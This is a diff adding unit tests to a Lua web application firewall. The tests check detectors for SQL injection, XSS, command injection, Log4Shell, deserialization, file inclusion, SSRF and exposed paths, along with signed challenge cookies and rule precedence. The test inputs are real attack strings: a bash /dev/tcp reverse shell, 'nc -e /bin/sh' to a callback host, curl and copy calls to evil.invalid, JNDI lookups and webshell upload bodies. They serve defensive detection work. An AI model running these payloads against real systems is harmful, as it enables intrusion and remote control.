@@ -123,6 +123,19 @@ local function new_dict()
             T.dict_store[k] = {v = v, ttl = ttl}
             return true
         end,
+        add = function(_, k, v, ttl)
+            if T.dict_store[k] then return false, "exists" end
+            T.dict_store[k] = {v = v, ttl = ttl}
+            return true
+        end,
+        incr = function(_, k, amount, init)
+            local current = T.dict_store[k] and tonumber(T.dict_store[k].v)
+            if current == nil then current = init end
+            if current == nil then return nil, "not found" end
+            current = current + amount
+            T.dict_store[k] = {v = current}
+            return current
+        end,
         delete = function(_, k) T.dict_store[k] = nil end,
     }
 end
@@ -136,6 +149,8 @@ ngx.var = setmetatable({}, {
 })
 ngx.log = function() end
 ngx.ERR = 1
+ngx.hmac_sha1 = function(secret, value) return secret .. ":" .. value end
+ngx.encode_base64 = function(value) return value:gsub("[^%w]", "_") end
 ngx.say = function(...) for _, s in ipairs({...}) do T.resp_body[#T.resp_body+1] = tostring(s) end T.resp_body[#T.resp_body+1] = "\n" end
 ngx.exit = function(code) T.exited = code error({__ngx_exit = true}) end
 ngx.header = setmetatable({}, {
@@ -143,6 +158,12 @@ ngx.header = setmetatable({}, {
     __newindex = function(_, k, v) T.resp_headers = T.resp_headers or {} T.resp_headers[k] = v end,
 })
 ngx.shared = { waf_dict = new_dict() }
+ngx.timer = {at = function(delay, fn, ...)
+    -- Execute immediate callbacks; recurring production timers are not advanced
+    -- automatically in the unit-test clock.
+    if delay == 0 or delay == 0.05 then fn(false, ...) end
+    return true
+end}
 ngx.req = setmetatable({}, {
     __index = function(_, k)
         if k == "get_headers" then return function() return T.headers end end
@@ -233,6 +254,13 @@ check("path enc", nz.normalize_path("/a/%2e%2e/etc/passwd") == "/etc/passwd")
 check("path trailing", nz.normalize_path("/a/b/../") == "/a/")
 check("path no change", nz.normalize_path("/a/b/c") == "/a/b/c")
 
+-- ==================== config / log privacy ====================
+local cfg = require("waf.config")
+check("log redacts password", cfg.sanitize_log_value("name=a&password=secret") == "[redacted]")
+check("log redacts authorization case insensitive", cfg.sanitize_log_value("Authorization: Bearer abc") == "[redacted]")
+check("log truncates oversized value", #cfg.sanitize_log_value(string.rep("a", cfg.LOG_VALUE_LIMIT + 10)) < cfg.LOG_VALUE_LIMIT + 20)
+check("log keeps ordinary value", cfg.sanitize_log_value("page=2") == "page=2")
+
 -- ==================== semantic ====================
 local sem = require("waf.semantic")
 -- SQLi
@@ -244,6 +272,11 @@ check("sqli stacked", sem.detect_sqli("1; DROP TABLE users"))
 check("sqli sleep", sem.detect_sqli("1; WAITFOR/SLEEP(5)"))
 check("sqli benchmark", sem.detect_sqli("1 AND BENCHMARK(5000000,MD5(1))"))
 check("sqli info_schema", sem.detect_sqli("1 UNION SELECT table_name FROM information_schema.tables"))
+check("sqli gtid subset", sem.detect_sqli("GTID_SUBSET(CONCAT(0x7e,(SELECT user()),0x7e),3550)"))
+check("sqli waitfor delay", sem.detect_sqli("2';WAITFOR DELAY '0:0:13' --"))
+check("sqli server variable", sem.detect_sqli("1' and 1=(select @@version) --"))
+check("sqli hashbytes", sem.detect_sqli("select sys.fn_varbintohexstr(hashbytes('MD5','x'))"))
+check("sqli credential concat", sem.detect_sqli("concat(username,0x3a,password)"))
 check("sqli encoded", sem.detect_sqli("%27%20OR%20%271%27%3D%271")) -- URL 编码的 ' OR '1'='1
 check("sqli normal", not sem.detect_sqli("hello world"))
 check("sqli normal2", not sem.detect_sqli("2024-01-01 order#123"))
@@ -261,6 +294,9 @@ check("xss encoded", sem.detect_xss("%3Cscript%3Ealert(1)%3C/script%3E"))
 check("xss entity", sem.detect_xss("&lt;script&gt;alert(1)&lt;/script&gt;"))
 check("xss cookie", sem.detect_xss("document.cookie"))
 check("xss eval", sem.detect_xss("eval(String.fromCharCode(97))"))
+check("xss attribute breakout", sem.detect_xss('" onmouseover="alert(document.domain)"'))
+check("xss alert domain", sem.detect_xss("';alert(document.domain)//"))
+check("xss prompt breakout", sem.detect_xss("'-prompt(1)-'"))
 check("xss normal", not sem.detect_xss("I <3 cats & dogs"))
 check("xss normal html talk", not sem.detect_xss("how to use <div> tags"))
 check("xss normal js", not sem.detect_xss("learn javascript: basics"))
@@ -271,6 +307,11 @@ check("rce dollar", sem.detect_rce("$(cat /etc/passwd)"))
 check("rce chain", sem.detect_rce("foo; whoami | nc 1.2.3.4 4444"))
 check("rce bash -i", sem.detect_rce(";bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"))
 check("rce encoded", sem.detect_rce("%3B%20cat%20%2Fetc%2Fpasswd"))
+check("rce expr probe", sem.detect_rce("expr 123456 + 654321"))
+check("rce echo redirect", sem.detect_rce("1|echo probe > /tmp/result.txt"))
+check("rce touch", sem.detect_rce("/tmp/a;touch /tmp/proof"))
+check("rce command curl", sem.detect_rce("curl http://dnslog.invalid/probe"))
+check("rce newline id", sem.inspect("test:1-100\\n/usr/bin/id", "/") and sem.inspect("test:1-100\\n/usr/bin/id", "/").type == "rce")
 check("rce normal", not sem.detect_rce("a|b review"))
 check("rce normal2", not sem.detect_rce("price is 100|200"))
 check("rce plain no meta", not sem.detect_rce("cat photos"))
@@ -280,6 +321,7 @@ check("lfi abs", sem.detect_lfi("/etc/passwd"))
 check("lfi filter", sem.detect_lfi("php://filter/convert.base64-encode/resource=index.php"))
 check("lfi null byte", sem.detect_lfi("file.txt%00.php"))
 check("lfi windows", sem.detect_lfi("..\\..\\windows\\system32"))
+check("lfi traversal before collapse", sem.detect_lfi("/api/filemanager?path=/../../etc/passwd"))
 check("lfi normal", not sem.detect_lfi("/docs/readme.md"))
 check("lfi normal2", not sem.detect_lfi("user/profile"))
 check("lfi normal dotted", not sem.detect_lfi("./relative/path"))
@@ -293,10 +335,119 @@ check("ssrf localhost", sem.detect_ssrf("http://localhost/admin"))
 check("ssrf gopher", sem.detect_ssrf("gopher://127.0.0.1:6379/_INFO"))
 check("ssrf normal", not sem.detect_ssrf("https://example.com/api"))
 check("ssrf normal2", not sem.detect_ssrf("https://10.example.com/"))
+check("ssrf oast callback", sem.detect_ssrf("http://abc.oast.live/probe"))
+check("ssrf rmi callback", sem.detect_ssrf("rmi://118.195.206.7:1099/object"))
+-- Extended P1 payload families from detect_log.xlsx
+check("log4shell direct", sem.detect_log4shell("${jndi:ldap://example.invalid/a}"))
+check("log4shell obfuscated", sem.detect_log4shell("${${x:-j}${x:-n}${x:-d}${x:-i}:ldap://example.invalid/a}"))
+check("code php", sem.detect_code_injection("<?php system('id');?>"))
+check("code freemarker", sem.detect_code_injection('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'))
+check("code node", sem.detect_code_injection("process.mainModule.require('child_process').execSync('id')"))
+check("code process builder", sem.detect_code_injection('new java.lang.ProcessBuilder("id").start()'))
+check("code ognl", sem.detect_code_injection("%{#context['com.opensymphony.xwork2.ActionContext.container']}"))
+check("code php probe", sem.detect_code_injection("printf(md5('probe'));"))
+check("code php print probe", sem.detect_code_injection("print(md5(31337));"))
+check("code jsp probe", sem.detect_code_injection('<%@Page Language="C#"%><%Response.Write(1);%>'))
+check("code dede runphp", sem.detect_code_injection("{dede:field name='source' runphp='yes'}echo md5(1){/dede:field}"))
+check("ssti arithmetic", sem.detect_ssti("{{1337*1338}}"))
+check("deserialize java", sem.detect_deserialization("java.util.HashMap org.apache.commons.collections.Transformer"))
+check("deserialize php", sem.detect_deserialization('O:23:"yii\\db\\BatchQueryResult":1:{}'))
+check("deserialize fastjson autotype", sem.detect_deserialization('{"@type":"java.lang.AutoCloseable"}'))
+check("deserialize fastjson jdbc", sem.detect_deserialization('{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://example.invalid/x"}'))
+check("deserialize java gadget name", sem.detect_deserialization("javax.naming.ldap.Rdn_-RdnEntry"))
+check("deserialize ordinary type", not sem.detect_deserialization('{"@type":"com.example.Order","id":1}'))
+check("xxe external entity", sem.detect_xxe('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><a>&x;</a>'))
+check("exposure actuator", sem.detect_exposure("/actuator/env"))
+check("exposure webshell", sem.detect_exposure("/webshell.php"))
+check("exposure database dump", sem.detect_exposure("/customer.example.sql"))
+check("exposure site archive", sem.detect_exposure("/wwwroot.rar"))
+check("exposure web config", sem.detect_exposure("/WEB-INF/web.xml"))
+check("exposure ordinary php", not sem.detect_exposure("/index.php"))
+check("exposure ordinary archive", not sem.detect_exposure("/downloads/release.zip"))
+-- File upload
+check("upload php extension", sem.detect_upload('Content-Disposition: form-data; name="f"; filename="shell.php"\r\n\r\nhello'))
+check("upload double extension", sem.detect_upload('Content-Disposition: form-data; name="f"; filename="shell.php.jpg"\r\n\r\nhello'))
+check("upload php content", sem.detect_upload('Content-Disposition: form-data; name="f"; filename="photo.jpg"\r\n\r\n<?php system($_GET[x]); ?>'))
+check("upload shell content", sem.detect_upload('Content-Disposition: form-data; name="f"; filename="note.txt"\r\n\r\n#!/bin/sh\nid'))
+check("upload normal image", not sem.detect_upload('Content-Disposition: form-data; name="f"; filename="photo.jpg"\r\n\r\nJFIFdata'))
 -- inspect 统一入口
 local hit = sem.inspect("' OR '1'='1", "/login")
 check("inspect returns sqli", hit and hit.type == "sqli")
 check("inspect clean", sem.inspect("hello", "/") == nil)
+-- detect_log.xlsx 补充签名（本轮新增）
+check("sqli bare boolean probe", sem.detect_sqli("1 AND 1=2"))
+check("sqli or boolean probe", sem.detect_sqli("2 or 3=4"))
+check("sqli and no comment", sem.detect_sqli("admin' AND 1=2 --"))
+check("rce shellshock", sem.detect_rce("() { :; }; echo; /bin/bash -c 'expr 1 + 2'"))
+check("rce cmd id probe", sem.detect_rce("/randomPath?cmd=id"))
+check("rce cmd whoami probe", sem.detect_rce("/x?cmd=whoami"))
+check("rce sh -c quote", sem.detect_rce("sh -c 'curl http://evil.invalid'"))
+check("rce cmd normal", not sem.detect_rce("/search?cmd=play"))
+check("log4shell nested obf", sem.detect_log4shell("${:-y$}${${syl:-j}nd${env:sce:-}i:r${ivd::-m}i://1.2.3.4:14288/x}"))
+check("code print digits plus", sem.detect_code_injection("print(811135720+853369319)"))
+check("code print digits encoded plus", sem.detect_code_injection("print(811135720%2b853369319)"))
+check("code memberaccess", sem.detect_code_injection("('\\43_memberAccess.allowStaticMethodAccess')(a)"))
+check("code key velocity", sem.detect_code_injection("' #request['.KEY_velocity.struts2.context'].internalGet('ognl')"))
+check("code ognl request", sem.detect_code_injection("x=#request['a'] y=ognl"))
+check("code classloader path", sem.detect_code_injection("/index.action?class.classLoader.parent"))
+check("code thinkphp construct", sem.detect_code_injection("__construct()"))
+check("code groovy execute", sem.detect_code_injection('throw new Exception(\'ipconfig\'.execute().text);'))
+check("code apisix lua", sem.detect_code_injection("function(vars) os.execute('curl x'); return true end"))
+check("code initialcontext", sem.detect_code_injection('${"".getClass().forName("javax.naming.InitialContext").newInstance().lookup("ldap://x")}'))
+check("code system ipconfig", sem.detect_code_injection("system(ipconfig)"))
+check("code tf md5", sem.detect_code_injection("tf(md5(2014346458));"))
+check("code php shorttag copy", sem.detect_code_injection('<?=copy("https://evil.invalid/1.txt","./runtime/config/x")'))
+check("code print normal words", not sem.detect_code_injection("print(money)"))
+check("exposure bsh servlet", sem.detect_exposure("/weaver/bsh.servlet.BshServlet"))
+check("exposure wls wsat", sem.detect_exposure("/wls-wsat/CoordinatorPortType"))
+check("exposure f5 bash", sem.detect_exposure("/mgmt/tm/util/bash"))
+check("exposure jmreport", sem.detect_exposure("/jmreport/testConnection"))
+check("exposure device rsp", sem.detect_exposure("/device.rsp?opt=user&cmd=list"))
+check("exposure captcha", sem.detect_exposure("/?s=captcha"))
+check("exposure actuator semicolon", sem.detect_exposure("/actuator;/env"))
+check("exposure center session", sem.detect_exposure("/center/api/session"))
+check("exposure excu shell", sem.detect_exposure("/excu_shell"))
+check("exposure phpunit", sem.detect_exposure("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"))
+check("exposure normal path", not sem.detect_exposure("/center/api/session/list"))
+-- inspect 端到端（含门控）
+hit = sem.inspect("/3IMNFGUfZEyszQ270gOsrXNVcK9?cmd=id", "/x")
+check("inspect cmd id e2e", hit and hit.type == "rce")
+hit = sem.inspect("print(811135720+853369319)", "/search.php")
+check("inspect print probe e2e", hit and hit.type == "code_injection")
+hit = sem.inspect("() { :; }; /bin/bash -c 'expr 1 + 2'", "/")
+check("inspect shellshock e2e", hit and hit.type == "rce")
+-- 第二轮：SSTI/RCE/SQLi 归一化绕过
+check("ssti space arithmetic", sem.detect_ssti("/*1*/{{883110996 885856194}}"))
+check("ssti plus arithmetic", sem.detect_ssti("{{883110996+885856194}}"))
+check("rce semicolon id redirect", sem.detect_rce("x;id>qqzfr.txt"))
+check("rce pipe id redirect", sem.detect_rce("|id >2037222.txt"))
+check("rce id chain", sem.detect_rce("x\nid;pwd;cat /etc/*-release\n"))
+check("rce pwd pipe", sem.detect_rce("admin|pwd"))
+check("rce echo pipe id", sem.detect_rce("echo ttgzkhtaeaaizmjcmiwfpvwnnwwsgkgh | id"))
+check("rce type win.ini backslash", sem.detect_rce("127.0.0.1\ntype C:\\Windows\\win.ini"))
+check("rce ping pipe", sem.detect_rce("ping 127.0.0.1 | cat nbmmnyhf"))
+check("rce expr ifs", sem.detect_rce("'\nexpr${IFS}875507985${IFS}-${IFS}924841934\n'"))
+check("rce dollar expr", sem.detect_rce("echo $(expr 847469661   865864647):84"))
+check("sqli jeecg from sys_user", sem.detect_sqli("' from sys_user/*, '"))
+check("sqli jeecg dict password", sem.detect_sqli("tableName=sys_user&text=password,salt"))
+check("rce normal id word", not sem.detect_rce("what is my user id"))
+-- 第三轮：字面 \n、版本注释、OAST、Windows 敏感路径
+check("sqli double quote tautology", sem.detect_sqli('""or""=""'))
+check("sqli numeric or probe", sem.detect_sqli("2147483647 or 1=2"))
+check("sqli mysql version comment", sem.detect_sqli("@`'`/*!50000Union */ /*!50000select */ md5(819315968) -- @`'`"))
+check("sqli dbms_pipe", sem.detect_sqli("1'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('h',8)"))
+check("sqli char concat", sem.detect_sqli("1' AND 5094 IN (SELECT (CHAR(113) CHAR(98) FROM dual)"))
+check("sqli case when select", sem.detect_sqli("3126'AND 4189=CAST('~'||(SELECT (CASE WHEN (4189=4189) THEN 1 ELSE 0 END)"))
+check("sqli normal or word", not sem.detect_sqli("color or size"))
+check("rce sh -c bare", sem.detect_rce("sh -c id"))
+check("rce nc -e", sem.detect_rce("nc -e /bin/sh 1234.abcdefgh.hzajrx6o.ser.dnslog.bid 1337"))
+check("rce md5sum", sem.detect_rce("echo CVE-2023-41109 | md5sum"))
+check("rce nslookup oast", sem.detect_rce("| nslookup d8b6417rtaj67p0ddcbgenk8mw1byrj1n.oast.me"))
+check("rce ping oast", sem.detect_rce("'\nping d8at5iqs3g7tohdr5q20hqikeqk4tnat1.oast.online\n'"))
+check("lfi windows win.ini", sem.detect_lfi("C:/windows/win.ini"))
+check("lfi windows backslash", sem.detect_lfi("C:\\Documents and Settings\\All Users\\Application Data"))
+check("lfi program files", sem.detect_lfi("C:\\Program Files (x86)\\Kingdee\\K3Cloud\\Web.config"))
+check("lfi normal windows path", not sem.detect_lfi("C:/Program Files/Windows Media Player"))
 
 -- ==================== expr ====================
 local expr = require("waf.expr")
@@ -309,6 +460,7 @@ check("expr and false", expr.eval('ip in "1.2.3.0/24" and method in ["GET"]', di
 check("expr or", expr.eval('method in ["GET"] or method in ["POST"]', dims) == true)
 check("expr or chain", expr.eval('method in ["GET"] or method in ["PUT"] or method in ["POST"]', dims) == true)
 check("expr contains", expr.eval('ua contains "curl"', dims) == true)
+check("expr false-positive ip path", expr.eval('ip in "1.2.3.4" and path eq "/admin/login"', dims) == true)
 check("expr eq", expr.eval('method eq "POST"', dims) == true)
 check("expr cookie", expr.eval('cookie contains "token"', {cookie = "token=abc"}) == true)
 check("expr reject bad char", expr.eval('os.execute("id")', dims) == false)
@@ -437,13 +589,20 @@ check("cc disabled by limit", cc.check({limit = -1}) == nil)
 -- ==================== challenge ====================
 local challenge = require("waf.challenge")
 reset_state()
-T.vars.cookie_waf_challenge = "ok"
-check("challenge passed", challenge.passed() == true)
-T.vars.cookie_waf_challenge = nil
-check("challenge not passed", challenge.passed() == false)
+T.vars.remote_addr = "1.2.3.4"
+T.vars.http_user_agent = "browser"
+T.vars.waf_challenge_secret = "test-secret"
 local ok_exit = pcall(function() challenge.respond() end)
 check("challenge respond exits 200", ok_exit == false and T.exited == 200)
-check("challenge sets cookie", T.resp_headers and tostring(T.resp_headers["Set-Cookie"]):find("waf_challenge=ok") ~= nil)
+local cookie = T.resp_headers and tostring(T.resp_headers["Set-Cookie"]):match("waf_challenge=([^;]+)")
+check("challenge sets signed cookie", cookie and cookie:match("^%d+%.[%w_%-]+$") ~= nil)
+check("challenge cookie is hardened", tostring(T.resp_headers["Set-Cookie"]):find("HttpOnly", 1, true) and tostring(T.resp_headers["Set-Cookie"]):find("SameSite=Lax", 1, true))
+T.vars.cookie_waf_challenge = cookie
+check("challenge passed", challenge.passed() == true)
+T.vars.cookie_waf_challenge = cookie:gsub(".$", "x")
+check("challenge rejects forged cookie", challenge.passed() == false)
+T.vars.cookie_waf_challenge = tostring(math.floor(T.now) - 1) .. ".forged"
+check("challenge rejects expired cookie", challenge.passed() == false)
 
 -- ==================== rules 名单引擎（rules.json 集成） ====================
 local RULES_FILE = "/tmp/waf_test_rules.json"
@@ -489,6 +648,17 @@ rules_scenario("rules allow beats deny", {global = {rules = {
     {id = 2, name = "allow", priority = 20, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "allow", enabled = true},
 }}}, base_dims, function(res) return res and res.action == "allow" end)
 
+-- Go 侧预编译的 exact 规则走映射快路径，且与慢路径保持 allow 优先语义。
+rules_scenario("rules compiled exact path", {global = {
+    rules = {},
+    compiled = {path = {["/index"] = {id = 10, name = "compiled-path", priority = 10, action = "deny"}}},
+}}, base_dims, function(res) return res and res.action == "deny" and res.rule.name == "compiled-path" end)
+
+rules_scenario("rules residual allow beats compiled deny", {global = {
+    rules = {{id = 11, name = "slow-allow", priority = 99, match_type = "path", match_value = "/index", match_op = "exact", action = "allow", enabled = true}},
+    compiled = {path = {["/index"] = {id = 12, name = "fast-deny", priority = 1, action = "deny"}}},
+}}, base_dims, function(res) return res and res.action == "allow" and res.rule.name == "slow-allow" end)
+
 -- 站点级覆盖全局：站点 deny 应胜过全局 allow
 rules_scenario("rules site beats global", {
     global = {rules = {{id = 1, name = "g-allow", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "allow", enabled = true}}},
@@ -521,6 +691,16 @@ rules_scenario("rules expired skipped", {global = {rules = {
 rules_scenario("rules unexpired applies", {global = {rules = {
     {id = 1, name = "fresh", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "deny", enabled = true, expires_at = "2999-01-01T00:00:00Z"},
 }}}, base_dims, function(res) return res and res.action == "deny" end)
+
+-- RFC3339 offset must be honored independently of the host timezone.
+local future_offset = os.date("!%Y-%m-%dT%H:%M:%S", T.now + 60 - 5 * 3600) .. "-05:00"
+rules_scenario("rules timezone offset applies", {global = {rules = {
+    {id = 1, name = "future-offset", priority = 10, match_type = "ip", match_value = "1.2.3.4", match_op = "exact", action = "deny", enabled = true, expires_at = future_offset},
+}}}, base_dims, function(res) return res and res.action == "deny" end)
+
+rules_scenario("rules site disabled", {global = {rules = {}}, sites = {['1'] = {enabled = false, rules = {}}}}, base_dims, function()
+    return require("waf.rules").site_enabled() == false
+end)
 
 -- match_op 变体：path contains / prefix / suffix / wildcard / regex
 local path_dims = function()
@@ -682,6 +862,16 @@ end, function()
     f:close()
     local evt = json.decode(line)
     return evt and evt.action == "deny" and evt.layer == "rules" and evt.ruleName == "deny"
+end)
+
+access_scenario("access compiled blacklist denies", {global = {
+    rules = {},
+    compiled = {path = {["/compiled-only"] = {id = 31, name = "compiled-deny", priority = 10, action = "deny"}}},
+}}, function()
+    T.vars.uri = "/compiled-only"
+    T.vars.request_uri = "/compiled-only"
+end, function()
+    return ngx.status == 403 and T.exited == 403
 end)
 
 -- 正常请求放行且无事件
